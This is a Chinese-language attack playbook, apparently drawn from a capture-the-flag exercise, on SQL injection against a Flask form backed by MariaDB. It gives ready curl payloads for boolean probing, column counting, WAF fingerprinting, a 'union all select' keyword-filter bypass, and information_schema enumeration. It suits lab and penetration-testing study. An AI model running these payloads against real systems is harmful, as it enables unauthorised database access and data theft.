# SQL 注入 + 关键字型 WAF 绕过的通用打法

## 什么时候用

看到下面这些可观察特征，就该走这条路线：

- 页面是一个表单查询（`<form method="post">`），参数名能从 HTML 源码直接读到；结果被渲染进表格，说明大概率存在 union 回显位。
- 服务端指纹是 Flask/gunicorn 这类轻框架，SQL 很可能是字符串拼接而非预编译。
- 响应里有**多种互不相同的失败提示**：查询失败 / 请求被拦截 / 未查询到，各自独立的 CSS class。三通道并存，等于同时提供了布尔信号、错误信号和 WAF 信号。
- 输入 `1 and 1=1` 结果不变、`1 and 1=2` 结果变空 → 布尔注入成立。
- 输入含 `union select` 时返回专门的拦截文案，而其它语法错误返回"查询失败" → 存在按关键字**字面**匹配的 WAF。

## 怎么做

设目标为 `$T`，注入参数为 `id`。

1. 基线：`curl -s -i "$T"`，记录 Server 头、表单 action/method/参数名、结果表格列数。
2. 布尔阳性/阴性对照：
   ```
   curl -s -X POST --data-urlencode "id=1 and 1=1" "$T"
   curl -s -X POST --data-urlencode "id=1 and 1=2" "$T"
   ```
   比较响应体里结果行数与"无结果"提示。两者不同即确认注入点。
3. 定列数：`id=1 order by N` 递增，直到出现"查询失败"，取 N-1 为列数。
4. WAF 指纹：先发一次标准 payload 记录拦截文案，再逐项变换（大小写、注释替换空格、`%0a`/`%09`、multipart `-F`、GET 查询串），每次只看**响应落在哪个通道**（拦截 / 失败 / 有结果）。
5. 绕过：若 WAF 匹配的是 `union`+单个空格+`select` 的连续子串，在中间插入额外 token 即可断开匹配。本次以 `union all select` 打通全程：
   ```
   curl -s -X POST --data-urlencode "id=0 union all select 1,2,3,4" "$T"
   ```
   同原理的 `union(select`、`union/*x*/select` 可按需再试。
6. 找回显列：看 `1,2,3,4` 分别出现在页面哪个位置，确认哪几列能放字符串。
7. 枚举：
   ```
   --data-urlencode "id=0 union all select database(),version(),user(),4"
   --data-urlencode "id=0 union all select 1,table_name,3,4 from information_schema.tables where table_schema=database()"
   --data-urlencode "id=0 union all select 1,column_name,3,4 from information_schema.columns where table_schema=database() and table_name='TARGET'"
   ```
8. 读值：把目标列替换进某个回显位，`from` 换成目标表。**重复执行两次**确认结果稳定一致，再提交。

## 坑

- 不要用 `-o /dev/null -w "%{http_code}"` 判断真假：本次所有响应（包括被 WAF 拦截的）都返回 200，必须比对响应体里的提示通道。
- 不要先入为主认为 WAF 拦一切：`1 and 1=1` 能正常执行就说明只过滤了特定组合，先做指纹再定绕过策略。
- 不要用 multipart（`-F`）或 GET 查询串绕：实测这些请求仍落到拦截通道，只有 POST urlencoded 能走通。
- 不要在 Windows 手拼 payload 的 URL 编码，逗号和空格容易被打断；统一用 `curl --data-urlencode`。
- 列数没定对时 union 会报"查询失败"，该提示与"请求已被 WAF 拦截"不同，混为一谈会误判绕过方案失效。
- 别一次改多个变量（大小写 + 注释 + 换行同时上），失败时分不清是哪个导致的。

## 边界

- 该绕过只对"字面连续子串匹配"的 WAF 成立。若 WAF 用 `union\s+(all\s+)?select` 之类的正则或 SQL 语法解析，`union all select` 会失效，需要重新指纹换方案。
- 需要 union 回显位（页面直接输出查询结果）。纯盲注场景要把枚举换成时间/布尔逐字符脚本。
- `information_schema` 仅 MySQL/MariaDB 系可用；其它 DBMS 系统表与 `database()`/`version()` 函数名不同。
- 本次后端为 MariaDB 11.8，`order by` 定列与 union 类型兼容性在该版本验证通过；更老版本对注释与空格的解析可能不同。
- 全程依赖目标在线；本次记录即为唯一依据，目标下线后无法复核。
